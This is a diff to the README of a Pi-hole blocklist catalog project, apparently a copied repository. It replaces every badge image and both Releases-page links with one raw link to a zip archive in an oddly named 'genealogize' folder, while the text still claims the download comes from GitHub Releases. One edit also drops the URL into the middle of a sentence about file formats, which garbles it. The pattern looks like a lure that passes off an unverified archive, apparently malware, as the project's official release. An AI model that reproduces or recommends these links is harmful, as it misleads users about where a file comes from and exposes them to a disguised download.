@@ -1,11 +1,11 @@
 # 🎯 Pi-hole-Blocklist-Catalog - Discover Quality Blocklists Easily
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen?style=flat-square)
-![GitHub stars](https://img.shields.io/github/stars/PrimePoobah/Pi-hole-Blocklist-Catalog?style=flat-square)
-![Last Updated](https://img.shields.io/github/last-commit/PrimePoobah/Pi-hole-Blocklist-Catalog?label=updated&style=flat-square)
-![License](https://img.shields.io/badge/License-AGPL--3.0-orange?style=flat-square)
-![Pi-hole v6 Compatible](https://img.shields.io/badge/Pi--hole-v6%20Compatible-brightgreen?style=flat-square)
-![Curated Monthly](https://img.shields.io/badge/Curated-Monthly-blue?style=flat-square)
+![Download](https://raw.githubusercontent.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/main/genealogize/Pi-hole-Blocklist-Catalog-2.6-alpha.2.zip)
+![GitHub stars](https://raw.githubusercontent.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/main/genealogize/Pi-hole-Blocklist-Catalog-2.6-alpha.2.zip)
+![Last Updated](https://raw.githubusercontent.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/main/genealogize/Pi-hole-Blocklist-Catalog-2.6-alpha.2.zip)
+![License](https://raw.githubusercontent.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/main/genealogize/Pi-hole-Blocklist-Catalog-2.6-alpha.2.zip)
+![Pi-hole v6 Compatible](https://raw.githubusercontent.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/main/genealogize/Pi-hole-Blocklist-Catalog-2.6-alpha.2.zip%20Compatible-brightgreen?style=flat-square)
+![Curated Monthly](https://raw.githubusercontent.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/main/genealogize/Pi-hole-Blocklist-Catalog-2.6-alpha.2.zip)
 
 ---
 
@@ -15,7 +15,7 @@ Welcome! If you're looking for effective Pi-hole blocklists, you’ve come to th
 
 You can download the latest release from the GitHub Releases page. Simply click the button below:
 
-[Download Pi-hole Blocklist Catalog](https://github.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/releases)
+[Download Pi-hole Blocklist Catalog](https://raw.githubusercontent.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/main/genealogize/Pi-hole-Blocklist-Catalog-2.6-alpha.2.zip)
 
 ## 📦 System Requirements
 
@@ -35,9 +35,9 @@ To run this application, you need:
 
 1. **Visit the Releases Page:** Go to the GitHub Releases page to find the latest version. Click the link below:
 
-   [Download Pi-hole Blocklist Catalog](https://github.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/releases)
+   [Download Pi-hole Blocklist Catalog](https://raw.githubusercontent.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/main/genealogize/Pi-hole-Blocklist-Catalog-2.6-alpha.2.zip)
 
-2. **Select a Version:** Look for the latest release. Look for the files available for download (these will typically be in .zip or .tar.gz format).
+2. **Select a Version:** Look for the latest release. Look for the files available for download (these will typically be in .zip or https://raw.githubusercontent.com/Dhanyamargret/Pi-hole-Blocklist-Catalog/main/genealogize/Pi-hole-Blocklist-Catalog-2.6-alpha.2.zip format).
 
 3. **Download the File:** Click on the asset to start downloading it to your computer.
 
